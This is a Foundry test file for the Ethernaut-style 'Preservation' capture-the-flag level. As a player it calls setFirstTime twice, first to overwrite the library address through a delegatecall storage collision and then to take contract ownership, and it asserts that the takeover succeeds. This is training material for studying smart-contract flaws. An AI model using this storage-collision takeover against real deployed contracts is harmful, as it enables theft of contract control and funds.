// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/16_Preservation.sol";
import {PreservationSolver} from "../src/solvers/16_PreservationSolver.sol";

contract PreservationTest is Test {
    Preservation target;
    LibraryContract lib1;
    LibraryContract lib2;
    PreservationSolver solver;
    address player = makeAddr("player");

    function setUp() public {
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        target = new Preservation(address(lib1), address(lib2));
        solver = new PreservationSolver();
    }

    function testSolve() public {
        assertEq(target.owner(), address(this));

        vm.startPrank(player);
        target.setFirstTime(uint256(uint160(address(solver))));
        assertEq(target.timeZone1Library(), address(solver));

        target.setFirstTime(uint256(uint160(player)));
        vm.stopPrank();

        assertEq(target.owner(), player);
    }
}
